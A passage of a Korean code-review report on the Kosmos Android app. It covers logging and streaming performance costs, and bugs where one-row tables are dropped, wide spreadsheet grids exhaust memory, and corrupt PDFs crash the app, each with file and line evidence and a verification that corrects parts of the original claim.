- 검증: 사실 부분은 맞다 — ChatViewModel.kt:306-321 화면이 보이는 동안 반복, 734-735행 2초/5초, DeviceResourceProvider.kt:37-38 주석 '수십 ms'와 53-56행 매번 Debug.getMemoryInfo, RuntimeMetricsCollector.refreshDeviceStatus(61-68행)가 온도와 메모리를 한 번에 갱신, ChatHeader.kt:320-326 캡슐에 앱 메모리 표시. 틀리거나 근거 없는 부분: '프로세스가 클수록 느리다 → 지금은 수십 ms 를 크게 넘을 수 있다'는 추정이다. 이 호출의 비용은 주로 매핑 수와 페이지 테이블에 잡힌 양에 달렸는데, 이 앱의 큰 몫(그래픽 5.6~5.8GB)은 GPU 쪽 메모리라 일반 매핑 훑기와 같은 비율로 늘지 않을 수 있다 — 코드만으로는 판정 불가(후보도 confidence=low). 호출은 Dispatchers.Default 워커에서 돌아 화면을 막지 않는다. 결함이라기보다 '재 볼 가치가 있는 항목'이다. 다만 값이 엔진을 올린 뒤 거의 변하지 않는다는 기록(:393)은 있으므로, 디버그 로그로 한 번 재고 온도와 메모리 주기를 가르는 것은 작고 안전한 정리다(실측 전에는 우선순위 낮음).
- 앞선 기록: CHANGELOG 0.41.9 M3(:360 상태 폴링을 화면이 보일 때만), ADR-015 부근 architecture.md:1407-1408('수십 ms, 폴링은 화면이 결정한다'), CHANGELOG 0.41.6(:393 PSS 6.46~6.97GB). 지금 메모리 크기에서 한 번의 비용을 잰 기록은 없음

### perf-6 · 매일 쓸 디버그 빌드에서 엔진 상세 로그와 벤치마크 측정이 항상 켜져 있다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 측정·진단용 스위치가 '디버그 빌드인가' 하나에 묶여 있어, 디버그 빌드로 실사용하면 답을 만드는 내내 토큰 단위 로그가 쏟아진다. 로그 쓰기 비용이 답 속도와 발열에 얹히고, 정작 봐야 할 앱 로그가 밀려난다. 릴리스 전환을 미룬 결정과는 별개로, 스위치만 바꾸면 되는 일이다.
- 제안: 이미 있는 방식(앱 외부 폴더의 debug_mtp.txt·debug_embed.txt)과 같은 결로 '상세 로그 켜기' 파일 스위치를 하나 둔다. 기본은 네이티브 로그 WARNING·벤치마크 꺼짐, 파일이 있을 때만 지금처럼 INFO·벤치마크 켜짐. 휴대폰 확인·측정 때만 파일을 넣고 실사용 때는 뺀다(real_use_start.md 의 '디버그 파일 지우기' 줄에 한 줄 추가). 벤치마크 측정이 답 속도에 주는 영향은 켜고 끈 두 번의 t/s 로 확인하면 된다. 릴리스 빌드·R8 과는 무관하다.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:589-594 — 디버그 빌드면 네이티브 로그를 INFO 로 연다. 같은 주석이 '릴리스는 토큰 단위 INFO 가 필요한 로그를 밀어낸다'고 적는다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:599 — 디버그 빌드면 턴마다 벤치마크 측정을 켠다
  - app/src/main/java/com/kosmos/app/runtime/gemma/RuntimeDiagnostics.kt:33-39, 65-68, 114-115 — 턴마다 KV 사용량·벤치마크·턴 내용(프롬프트와 답)을 로그로 남긴다
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:83 — WorkManager 로그도 INFO
  - docs/checklists/real_use_start.md:4 — 매일 쓸 빌드는 디버그 빌드 그대로
- 검증: 맞는 부분 — GemmaModelRunner.kt:589-594 디버그면 네이티브 로그 INFO, 599행 디버그면 벤치마크 켬, RuntimeDiagnostics.kt:33-42·65-76 턴마다 KV·벤치마크 로그, KosmosApp.kt:83 WorkManager INFO, real_use_start.md:3 디버그 빌드로 실사용. 틀린 부분 두 가지. (1) '턴 내용(프롬프트와 답)을 로그로 남긴다'는 틀렸다 — logTurn(RuntimeDiagnostics.kt:109-115)은 글자 수·툴 이름·활성 툴 목록만 남기고 내용은 남기지 않는다(프리페이스 원문 로그는 :1347 에서 이미 정리). (2) 제안대로 벤치마크를 기본으로 끄면 가드가 조용히 죽는다 — 채팅 밖 추론의 출력 상한 폭주 판정(GemmaModelRunner.kt:390-395)이 RuntimeDiagnostics.decodedTokens(80-82행, 벤치마크 정보)에서 토큰 수를 읽으므로 벤치마크가 꺼지면 null 이 되어 0.42.4 의 폭주 차단·diag_runaway.txt 기록이 실사용 빌드에서 동작하지 않는다. 따라서 파일 스위치로 내릴 수 있는 것은 네이티브 로그 등급(INFO → WARNING)뿐이고 벤치마크는 그대로 둬야 한다. 또 네이티브 INFO 로그가 답 속도·발열에 주는 비용은 잰 적이 없어 이득도 미확인이며, 실사용 중 문제가 생겼을 때 단서가 되는 로그를 기본으로 끄는 대가도 있다. 켜고 끈 두 번의 속도 비교가 먼저다.
- 앞선 기록: CHANGELOG :1347(진단 수단을 일부러 디버그 빌드로 한정), 0.38.7 M5(:653 '휴대폰 확인·로그가 디버그 빌드에 맞춰져 있다', 개인용 최적화 빌드는 넣지 않음 — 사용자 결정), 0.41.1(:471 벤치마크 로그 도입), 0.42.4(출력 상한 폭주 판정이 벤치마크 값에 의존), docs/checklists/real_use_start.md:3

### perf-7 · 스트리밍 토큰마다 답 전체를 서너 번 다시 훑는다 — 주석은 '제곱 비용을 피했다'고 하지만 실제로는 남아 있다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 지금 답 길이(수백 토큰)와 속도(초당 10토큰 안팎)에서는 체감되지 않는다. 다만 이 일은 엔진 스레드에서 토큰을 받는 자리에서 돌고, 답이 길어질수록 제곱으로 늘며, 코드의 설명과 실제가 다르다 — 면접에서 '여기 제곱 비용을 없앴다'고 말했다가 되짚이면 약점이 된다.
- 제안: 화면 갱신과 같은 박자로 맞춘다 — 토큰은 StringBuilder 에 붙이기만 하고, 꼬리 창(이미 있는 tailWindow)으로 태그·ISO 꼬리 가능성만 싸게 본 뒤, 전체 문자열 변환(toString·태그 자르기·일시 표기)은 마지막 전달로부터 일정 간격(예: 50ms)이 지났을 때와 턴이 끝날 때만 한다. 최종 저장 글은 지금처럼 턴 끝에 한 번 전체를 처리하므로 결과는 같다. 주석도 실제 동작에 맞게 고친다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:107-118 — 주석은 StringBuilder 로 O(n²) 복사를 피한다고 적지만, 바로 아래에서 토큰마다 accumulated.toString() 으로 전체를 복사한다
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:133 — 토큰마다 전체 문자열에서 태그 위치를 두 번 찾는다(ToolParser.stripIncompleteTag, ToolParser.kt:89-105)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:136 — 토큰마다 전체 문자열에 정규식 치환 두 번(IsoDateTimeParser.humanizeStreaming, IsoDateTimeParser.kt:126-131)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:605-618 — 화면은 50ms 에 한 번만 그리는데, 그 앞 단계는 토큰마다 전부 계산한다
- 검증: BaseAgent.kt:107-108 주석은 StringBuilder 로 O(n²) 복사를 피한다고 하지만 118행에서 토큰마다 accumulated.toString() 으로 전체를 복사하고, 133행 ToolParser.stripIncompleteTag(ToolParser.kt:89-105 — 여는 태그마다 전체 indexOf + 꼬리 접두사 검사), 136행 IsoDateTimeParser.humanizeStreaming(IsoDateTimeParser.kt:126-131 — ISO_TAIL 정규식 replace 뒤 107행 ISO_IN_TEXT 전체 검색)을 토큰마다 전체 문자열에 돌린다. 119-120행 주석이 피했다고 하는 것은 태그 파싱(parseStream)뿐이고, 0.38.9 에서 더해진 ISO 표기 단계가 토큰마다 전체 정규식 훑기를 다시 들여왔다 — 주석·ADR-007 의 설명과 실제가 어긋난다. 화면은 ChatScreen.kt:605-620 에서 50ms 에 한 번만 그린다. 이 콜백은 GemmaModelRunner.kt:319-328 collect 안(LLM 디스패처)에서 돈다. 주장 그대로 맞다. 다만 실제 비용은 작다 — 수백 토큰·수천 자 답이면 총 복사량이 수 MB 수준이라 초당 10토큰 안팎에서는 체감·배터리 영향이 사실상 없다. 가치는 성능보다 '코드 설명과 실제의 불일치'(면접 방어) 쪽이므로 최소 수정은 주석 정정이고, 갱신 박자 맞추기는 선택이다. 최종 저장 글은 턴 끝에 따로 처리되므로(162행 parseStream) 묶어도 결과는 같다.
- 앞선 기록: ADR-007(architecture.md:1311 '태그 감지 후에만 파싱 — 토큰마다 전체 문자열 정규식 재파싱은 O(n²)'), CHANGELOG 0.38.9(:651 답 속 ISO 표기 도입), 0.41.9(:362 화면 쪽만 50ms 묶기, 같은 분석의 나머지는 하지 않기로 — 이 경로는 그 목록에 없음)

<details><summary>읽은 범위</summary>

[직접 읽은 것] KosmosApp, StartupCoordinator, ConversationPrewarmer, ModelWarmUpObserver, MainActivity, SplashScreen·SplashStage·PlanetScene·SplashDraw(DotBatch), ChatViewModel 전체, ChatScreen 전체, ChatBubbles, ChatTimeline, GemmaModelRunner 전체, GemmaRuntimeManager, TurnCancellation, BaseAgent 의 스트리밍·실패 처리 구간, ToolParser 일부, AssistantOrchestrator, ContextBuilder, EpisodeSummarizeScheduler 대부분, MemoryEmbedder, EmbeddingGemmaRunner, MemorySemanticRanker, SearchMemoryToolExecutor 의 뜻 검색 구간, LibraryRepositoryImpl, MemoryVectorRepositoryImpl, 벡터·대화·활동 기록 DAO 와 색인, CountedPagingSource, RuntimeMetricsCollector, DeviceResourceProvider, 위젯 3개 파일과 widget_kosmos_info.xml, 브리핑 알림 예약·워커, InputActivity, Constants 의 관련 상수, CHANGELOG·architecture.md·checklists 의 관련 대목(grep).
[훑어보기만 한 것 — 확신 낮음] DocumentOpener·XlsxReader·LibraryIndexer·ExportImportManager(크기 상한·IO 스레드만 grep 으로 확인, 큰 문서 파싱 메모리는 0.41.14 에서 상한이 들어가 있어 새 항목 없음), DrawerViewModel(검색 300ms 지연 확인), ChatInputBar(녹음 파형 루프만), ChatHeader, RuntimeDiagnostics, MtpMode. 읽지 못한 것: MemoryScreen·CalendarScreen·SheetView·AuditScreen 의 목록 구성, LibraryEmbedder 본문, MorningBriefingGenerator 본문, ModelDownloadWorker, SpeechOutput, GalaxyScene, ChatExtrasViewModel. gradle·adb·테스트·실험은 규칙대로 실행하지 않았고 그래프 도구는 쓰지 않았다(grep·파일 읽기만).
[확인했지만 문제 아님으로 본 것] 메인 스레드 디스크·DB 접근(runBlocking 0건, DB 는 suspend, 앱 시작 때 파일 목록 조회 한 번뿐), Compose 재구성(Kotlin 2.4 라 강한 건너뛰기가 기본 — 토큰마다 ChatScreen 본문은 다시 돌지만 행은 건너뛰고 말풍선은 50ms 간격), 쉬는 화면에서 도는 무한 애니메이션 없음(TwinkleStars 는 답 대기 때만), 임베딩 전수 비교(보관함 상한 1,000만 자에서도 벡터 약 15MB 를 2,000개씩 읽어 내적 — 답 생성 시간에 비해 작음), 기억 뜻 검색(후보 벡터만 읽음), 요약·자동 추출 드레인(조용한 창·입력 대기·항목 사이 중단이 이미 들어가 있음), 대화·활동 기록 색인, 토큰 수 추정기(글자 세기라 쌈).
[버린 항목 4건] ① 스플래시 입자 800개가 프레임마다 Pair 를 새로 만드는 것(PlanetScene.kt:78, 269) — 0.38.8·0.38.7 에서 입자 수는 병목이 아니라고 실측돼 있어 사소함. ② 포그라운드 복귀 뒤 첫 기억 검색이 임베딩 엔진을 턴 안에서 올리는 것 — CPU 엔진 로드가 수 초일 수 있으나(CHANGELOG 0.41.2 실측 CPU 7.5초는 옛 값) 지금 값의 기록이 없어 추정만으로는 내지 않음. 실사용 중 '기억 검색 첫 번만 느리다'가 보이면 이것부터 볼 것. ③ MainActivity 로 돌아올 때마다 warmUp 이 준비 상태를 잠깐 '파일 발견→초기화 중'으로 흔들어 시작 단계가 다시 도는 것 — 0.16.2·0.41.7 에서 알고 설계한 동작. ④ 서랍 검색이 map 이라 앞 질의의 임베딩이 끝나야 다음이 도는 것 — 300ms 지연이 있어 영향 작음.
[범위 밖이지만 본 것] perf-1 의 같은 경로로, 승인 시트가 떠 있는 동안 앱이 백그라운드로 가면 엔진이 내려가 승인 뒤 툴 회신이 실패할 수 있다(저장은 됐는데 오류 말풍선) — 성능이 아니라 동작 결함 쪽이라 perf-1 의 증거·제안에만 적었다. RuntimeDiagnostics.logTurn 이 디버그 빌드에서 대화 내용을 로그에 남기는 것은 보안 영역 담당이 볼 항목이다.
[수치의 근거] 9~12초·8.4초·4.6초·6.5~7GB 는 모두 CHANGELOG 의 휴대폰 실측 기록을 옮긴 것이고 이번에 새로 잰 값은 없다. perf-5 의 '수십 ms 보다 클 수 있다'와 perf-6 의 로그 비용은 측정 없는 추정이다.

</details>

## 문서 읽기·보관함·뷰어 그리기 전체 흐름 (아무도 본문을 읽지 않은 곳) (gap-docpipeline)

### gap-docpipeline-1 · 행이 하나뿐인 표·시트의 글이 색인과 채팅 보내기에서 통째로 사라진다
- 판정 확인됨 · 중요도 높음 · 크기 S
- 왜: 한글(hwpx) 공문서는 제목·개요·안내문을 1행 1열 표로 감싸 상자처럼 쓰는 일이 아주 흔하다. 이런 표의 글은 보관함 색인에 한 글자도 들어가지 않아 검색되지 않고, 뷰어에서 그 블록만 골라 채팅으로 보내면 '0 / 290자'에 보내기 버튼이 눌려도 아무 일도 없다. 한 행뿐인 시트·csv 는 등록 자체가 '글자 없음'으로 실패한다(LibraryIndexer.kt:101-104). 표가 여러 행이어도 첫 행이 제목 줄이 아닌 배치용 표면 첫 행 내용이 매 행 앞에 열 이름처럼 반복돼 붙는다. 실사용(한글 문서 검색)과 포트폴리오('문서를 조각내 검색') 양쪽에 직접 걸린다.
- 제안: DocumentText.table 의 '열이름: 값' 분기에서 행이 하나면 그 행의 칸을 그대로 이어 한 줄로 내보낸다(열 이름이 없으니 값만). 추가로 열이 하나뿐인 표(상자용 표)는 열 이름 붙이기를 생략하고 행마다 값만 내보내는 것을 검토. 두 행 이상인 기존 출력은 바이트가 바뀌지 않게 하고, DocumentTextTest·LibraryChunkerTest 에 1행 1열 표·1행 시트 사례를 추가한다. 채팅 첨부 글자는 모델 입력이지만 기존에 비어 있던 경우에만 글이 생기므로 형식 자체는 그대로다(회차에서 이 점을 CHANGELOG 에 적을 것).
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/document/DocumentText.kt:95-98 — '열이름: 값' 형식은 첫 행을 열 이름으로만 쓰고 clean.drop(1) 만 내보낸다. 행이 하나면 결과가 빈 목록
  - domain/src/main/java/com/kosmos/app/domain/document/DocumentText.kt:47-48 — tableLines 가 위 함수를 그대로 쓴다(읽기 모드 표)
  - domain/src/main/java/com/kosmos/app/domain/library/LibraryChunker.kt:80, 87-89 — 색인이 tableLines·sheetLines 결과만 본문으로 넣는다
  - domain/src/main/java/com/kosmos/app/domain/document/DocumentText.kt:61-70 — 채팅 보내기(flow)도 같은 경로. 빈 목록이면 ClippedText("", 0)
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerViewModel.kt:154, 187 — 미리보기는 null 이 아니라 '보내기'가 켜지지만 글자가 비어 sendToChat 이 false 로 끝난다(눌러도 반응 없음)
  - domain/src/test/java/com/kosmos/app/domain/library/LibraryChunkerTest.kt:99-100 — 테스트는 두 행짜리 시트만 다룬다
- 검증: 직접 확인. DocumentText.kt:95-98 — '열이름: 값' 분기는 clean.drop(1) 만 내보내 행이 하나면 빈 목록. :47-48 tableLines, :43-44 sheetLines 가 그대로 쓴다. 시트는 :54-55 에서 머리 행이 고른 범위 안이면 header=null, picked=[그 행] 이라 격자가 1행 → 빈 결과. LibraryChunker.kt:80, 87-89 가 그 결과만 본문으로 넣고, LibraryIndexer.kt:101-104 는 본문 글자 수 0 이면 NO_TEXT 로 실패 처리(시트 제목 줄은 Heading 이라 글자 수에 안 들어감). 뷰어: DocumentViewerViewModel.kt:154(tapBlock)는 고른 블록이 있으면 preview 를 null 이 아닌 ClippedText("",0) 로 두고, DocumentViewerScreen.kt:203 은 enabled = preview != null 이라 보내기가 켜지지만 :187 sendToChat 은 빈 글자라 false(DocumentViewerActivity.kt:85 — 아무 일도 없음). 시트에서 머리 행 한 줄만 골라도 같은 증상(:146). BlockSink(FlowDocument.kt:100-103)는 1행 1열 표도 Table 블록으로 만든다 — 풀어 주는 처리 없음. 테스트는 두 행 이상만 다룸(LibraryChunkerTest.kt:99-100). 여러 행 배치용 표에서 첫 행이 열 이름처럼 반복된다는 부분도 코드상 맞다(:96-97). 고칠 때 주의: 채팅 첨부 글자는 모델 입력이므로 두 행 이상 출력이 바이트 단위로 안 바뀌는지 기존 테스트로 고정할 것.
- 앞선 기록: CHANGELOG 0.35.0(열이름: 값 형식 결정), 0.36.1(표 제목 행을 열 이름에서 빼기). 한 행짜리 표·시트가 비는 것에 대한 기록은 CHANGELOG·architecture·plans 어디에도 없음

### gap-docpipeline-2 · 먼 열의 칸 하나·행 전체 병합이 있으면 시트를 '열 수 × 행 수' 빽빽한 격자로 펼쳐 메모리가 터진다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 엑셀에서 행 전체를 골라 '병합하고 가운데 맞춤'을 하거나 실수로 맨 오른쪽 열에 값을 넣은 파일은 드물지 않다. 그런 시트가 1,000행만 넘어도 참조만 수십~수백 MB 라 기본 힙(256MB 안팎)을 넘길 수 있고, 보관함 등록 중이면 앱이 죽은 뒤 문서가 '색인 중'으로 남았다가 다음에 '중단됨'이 되고 다시 눌러도 또 죽는다. 뷰어 자체는 200열로 끊어 그리지만(SheetView.kt:306) 데이터가 5열뿐인 시트도 200열을 매 행 그리게 돼 스크롤도 무거워진다. 코드로 확인한 계산이며 실제로 돌려 보지는 않았다.
- 제안: (1) DocumentText.sheetGrid 를 희소하게 — 머리 행의 '열 번호 → 이름' 맵을 한 번 만들고, 각 행은 row.cells 를 열 순서로 훑어 바로 '이름: 값' 줄을 만든다(빈 칸 자리를 만들지 않음). (2) XlsxReader 에서 columnCount 를 계산할 때 병합 범위는 글자가 있는 가장 먼 열 + 약간까지만 반영하고, 열 번호 자체도 엑셀 최대(16,384)로 자른다. (3) 넓은 병합 + 2천 행 합성 시트로 JVM 테스트를 추가해 격자 크기가 칸 수에 비례하는지 고정한다. 출력 글자는 그대로여야 한다(기존 DocumentText 테스트로 확인).
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/document/XlsxReader.kt:297, 335, 367-371 — 열 번호에 상한이 없고 columnCount = max(가장 먼 글자 칸, 병합 범위의 마지막 열) + 1. A1:XFD1 병합이나 XFD 열의 칸 하나로 16,384 가 된다
  - domain/src/main/java/com/kosmos/app/domain/document/DocumentText.kt:56-57 — 고른 행마다 List(width) 를 만들고 칸마다 row.cells.firstOrNull 로 찾는다(행 수 × 16,384 칸, 이어서 :87 에서 한 번 더 복사)
  - domain/src/main/java/com/kosmos/app/domain/document/DocumentText.kt:43-44 — 색인용 sheetLines 는 0..Int.MAX_VALUE 전체 행에 대해 이 격자를 만든다
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:142, 153-157 — 색인은 catch (e: Exception) 뿐이라 메모리 부족(Error)은 잡히지 않고 앱이 죽는다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerViewModel.kt:146 — 채팅으로 보낼 행 범위를 고를 때 같은 격자를 메인 스레드에서 만든다
  - app/src/main/AndroidManifest.xml — largeHeap 설정 없음(grep 결과 없음)
- 검증: 코드로 확인(실행은 안 함). XlsxReader.kt:297 열 번호는 CellRef.column(Sheet.kt:52-61) 결과 그대로 — 상한 없음. :309 병합 범위 수집, :367-371 columnCount = max(글자 있는 가장 먼 열, 병합의 마지막 열)+1. DocumentText.kt:56-57 이 고른 행마다 List(width) 를 만들고 :87 에서 한 번 더 복사한다. 색인용 sheetLines(:43-44)는 전체 행 대상. 16,384열 × 1,000행이면 참조만 약 65MB × 2벌, 행 상한 2만(DocumentSupport.kt:49)까지 가면 GB 단위라 기본 힙을 넘는다. LibraryIndexer.kt:153-157 은 Exception 만 잡아 OutOfMemoryError 는 앱 스코프(:56, 처리기 없음)에서 앱을 죽인다 — 이후 '중단됨' → 다시 누르면 같은 자리에서 또 죽는 고리. AndroidManifest 에 largeHeap 없음(grep 0건). 틀린 곳은 없으나 강도는 낮춘다: 유발 조건(행 전체 병합 A1:XFD1 또는 맨 끝 열의 값 + 수백~수천 행)이 흔하지 않아 high 가 아니라 medium. 메인 스레드 주장(DocumentViewerViewModel.kt:146)은 첫 탭이 한 행 범위라 실제 부담은 넓은 범위를 고를 때뿐 — 부차적. SheetView.kt:306 이 병합 때문에 빈 200열을 그리는 것도 맞다.
- 앞선 기록: plans/0.34.0-document-viewer.md:70 '희소 표현'(읽기 결과 Sheet 만 희소), CHANGELOG 0.34.0 200열 그리기 상한. 색인·보내기 쪽 빽빽한 격자에 대한 기록 없음

### gap-docpipeline-3 · 문서 열기·색인에서 예상 밖 예외 하나가 앱 전체를 죽인다(PDF 손상 쪽 등)
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 리더 안쪽(SAX 파싱)은 모든 예외를 '손상됨'으로 바꾸지만, 그 바깥(안드로이드 PDF 렌더러, zip 열기, 조각 나누기)은 그물망이 없다. 쪽 하나가 깨진 PDF 를 뷰어로 열거나 보관함에 넣으면 '손상됐어요' 안내 대신 앱이 꺼진다. 색인 중이었다면 문서가 '중단됨'으로 남고 다시 시도하면 같은 자리에서 또 꺼진다. 매일 쓰는 단계에서 받은 파일 하나로 앱이 죽는 것은 신뢰를 크게 깎고, 포트폴리오에서 '손상 파일 방어'를 설명할 때 구멍이 된다. PDF 쪽 열기 실패가 IllegalStateException 이라는 점은 플랫폼 동작 기억에 기댄 것이라 에뮬레이터에서 손상 PDF 로 확인이 필요하다.
- 제안: (1) AndroidDocumentOpener.open 의 마지막에 catch (e: CancellationException) 다시 던지기 + catch (e: RuntimeException) → 로그 후 CORRUPT 를 추가. (2) AndroidPdfPages 의 쪽 비율 읽기를 runCatching 으로 감싸 실패한 쪽은 A4 비율로 두고, openPdf 는 실패 시 렌더러·기술자·파일을 닫는다. (3) LibraryIndexer.index 의 try 를 readLines + store 전체로 넓혀 실패하면 OPEN_FAILED 로 표시하고, 스코프에 로그만 남기는 CoroutineExceptionHandler 를 단다. (4) 가짜 DocumentOpener 가 IllegalStateException 을 던지는 LibraryIndexerTest 한 건 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:130-140 — open 이 잡는 것은 DocumentException·SecurityException·FileNotFoundException·IOException 네 가지뿐
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:313-315 — PDF 를 열 때 생성자에서 앞 2,000쪽을 renderer.openPage 로 하나씩 연다. 쪽 하나를 못 읽으면 나는 IllegalStateException 은 위 목록에 없다(이때 렌더러·파일 기술자·캐시 복사본도 닫히지 않는다, :216-229)
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:56 — 앱 스코프에 예외 처리기가 없다
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:130 — opener.open 호출이 try 바깥
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:93, 100-122 — 조각 나누기·저장(store)도 try 바깥
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerViewModel.kt:217-219 — 뷰어도 open 결과를 그대로 기다린다(잡지 않음)
- 검증: 직접 확인. DocumentOpener.kt:130-140 은 DocumentException·SecurityException·FileNotFoundException·IOException 만 잡는다. :216-228 openPdf 는 PdfRenderer 생성자만 try 로 감싸고, AndroidPdfPages 생성(:228) 중 :313-315 가 앞 2,000쪽을 openPage 로 연다 — 여기서 나는 런타임 예외는 어디서도 안 잡히고 렌더러·기술자·캐시 파일도 안 닫힌다(render·pageText 는 runCatching 인데 생성자만 빠져 있음). 호출부: LibraryIndexer.kt:130 의 opener.open 은 try(:134) 바깥, index(:89-98)는 try/finally 뿐, 스코프(:56)에 처리기 없음 → 앱 종료. DocumentViewerViewModel.kt:217-219 도 viewModelScope.launch 안에서 그대로 기다림. store(:100-122)도 try 밖이지만 저장소가 AppResult 를 돌려줘 실제 위험은 PDF 쪽이 중심. 남는 불확실성: 깨진 쪽에서 openPage 가 IllegalStateException 을 던진다는 것은 플랫폼 동작(네이티브 'cannot load page')에 기댄 것이라 에뮬레이터에서 손상 PDF 로 확인 필요. 그와 무관하게 '그물망이 없다'는 구조 자체는 사실이고 고치는 비용이 작다.
- 앞선 기록: CHANGELOG:408 부근(미리 준비 스코프에 예외 처리기가 없어 앱이 죽을 수 있던 것 — 같은 종류를 다른 곳에서 고친 전례). 문서 열기·색인 경로의 예외 범위 기록은 없음

### gap-docpipeline-4 · 출처 카드가 여는 위치가 법령 조문·PDF 쪽에서만 맞는다 — 엑셀·제목 없는 문서·긴 절은 맨 위나 엉뚱한 곳
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 보관함의 대상은 법령만이 아니라 규정·교재·엑셀이다. 여러 시트짜리 가계부에서 3번째 시트의 행이 근거여도 카드를 누르면 첫 시트 맨 위가 열리고, 제목 스타일을 안 쓴 워드·한글 문서(대부분)는 항상 맨 위, '개요'처럼 여러 번 나오는 제목은 첫 번째 것으로 간다. 사용자는 근거를 눈으로 다시 찾아야 하고, 포트폴리오에서 '출처를 그 위치로 연다'고 설명할 때 법령 외에서는 성립하지 않는다.
- 제안: 출처 meta 에 조각 본문의 첫 줄 앞 30~40자를 추가로 싣고(모델에 보내는 결과 문구가 아니라 카드용 meta 만) 뷰어에 넘긴다. ViewerTarget.blockIndexOf 는 머리말로 찾은 위치 이후에서 그 첫 줄을 포함하는 블록을 한 번 더 찾아 조각 위치로 맞춘다(머리말이 문서 이름뿐이면 첫 줄만으로 찾는다). 시트는 머리말 '시트: 이름'에서 시트 이름을 뽑아 DocumentViewerViewModel.selectSheet 로 그 시트를 먼저 열고, 가능하면 첫 줄의 값으로 행을 찾아 스크롤한다. ViewerTargetTest 에 제목 없는 문서·같은 제목 반복·여러 조각 사례 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/tool/SearchDocumentsToolExecutor.kt:116-123 — 위치는 조각 머리말의 마지막 단계. 머리말이 없으면 쪽, 그것도 없으면 문서 이름
  - app/src/main/java/com/kosmos/app/feature/chat/result/DocSourceViewModel.kt:45 — 그 글자를 find 로 뷰어에 넘긴다(조각 번호 META_INDEX 는 저장만 하고 쓰지 않는다)
  - app/src/main/java/com/kosmos/app/feature/document/ViewerTarget.kt:23-30 — find 로 '시작하는' 첫 블록, 없으면 '포함하는' 첫 블록. 문서 이름이 find 면 본문에서 문서 이름이 처음 나오는 블록으로 가거나 맨 위
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerScreen.kt:147-156 — 스프레드시트 상태는 target 을 전혀 쓰지 않는다(항상 첫 시트 맨 위)
  - domain/src/main/java/com/kosmos/app/domain/library/LibraryChunker.kt:18-24, 87-89 — 조각에 시트 번호·행 번호가 없고 '시트: 이름' 제목만 있다
  - domain/src/main/java/com/kosmos/app/domain/library/LibraryChunker.kt:116-118 — 한 단위가 여러 조각이면 '(2/3)'만 붙고 뷰어는 그것을 떼고 제목 위치로 간다(ViewerTarget.kt:15, 24)
- 검증: 직접 확인. SearchDocumentsToolExecutor.kt:116-123 locationOf — 머리말 마지막 단계, 없으면 쪽, 그것도 없으면 문서 이름. :125-135 meta 에 META_INDEX 를 싣지만 DocSourceViewModel.kt:45, 58-63 은 section·page 만 읽어 find 로 넘긴다. ViewerTarget.kt:23-30 — 끝의 (n/m) 을 떼고 '시작하는' 첫 블록 → '포함하는' 첫 블록. DocumentViewerScreen.kt:147-156 시트 분기는 target 을 안 쓰고(135 PDF·145 흐름 문서만 사용) 뷰모델은 항상 0번 시트를 읽는다(DocumentViewerViewModel.kt:229). LibraryChunk(LibraryChunker.kt:18-24)에 시트·행 번호 없음, :116-118 여러 조각은 (i/n) 표시뿐. 따라서 여러 시트 엑셀은 첫 시트 맨 위, 제목 없는 흐름 문서는 문서 이름이 본문에 처음 나오는 곳이나 맨 위, 같은 제목이 반복되면 첫 번째, 긴 절의 뒤 조각은 절 머리로 간다. 결함이라기보다 설계 범위 밖의 빈틈. 제안대로 meta 에 본문 첫 줄을 싣는 것은 카드용 meta(sourcesMeta)만 바꾸면 모델에 가는 render 문구(:106-113)는 그대로라 모델 입력 변경 아님 — 다만 둘을 섞지 않게 주의.
- 앞선 기록: architecture.md:2240 '첫 출처를 뷰어의 그 위치(PDF 쪽·흐름 문서 머리말)로' — 설계 범위가 처음부터 쪽·머리말뿐. architecture.md:2251 '교재형 문서는 실기기에서 더 봐야 한다', device_gate.md:295 교재형 PDF 미확인. 시트·제목 없는 문서를 일부러 뺐다는 결정 기록은 없음

### gap-docpipeline-5 · 상한에 걸려 잘린 문서나 읽기 실패한 시트를 알리지 않고 일부만 색인한 채 '준비됨'으로 보인다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 보관함은 '전공서적 한 권 이상'을 목표로 문서당 200만 자를 받는다고 안내하지만, 그보다 먼저 뷰어용 상한(2만 블록·2만 행)에 걸리면 뒷부분이 빠진 채 정상 등록으로 보인다. 짧은 문단이 많은 긴 문서, 2만 행이 넘는 엑셀·csv, 시트 하나가 깨진 통합 문서에서 사용자는 '문서에 없는 내용'이라는 틀린 답을 받는다. 뷰어는 잘렸다고 알려 주는데 보관함은 알려 주지 않는다.
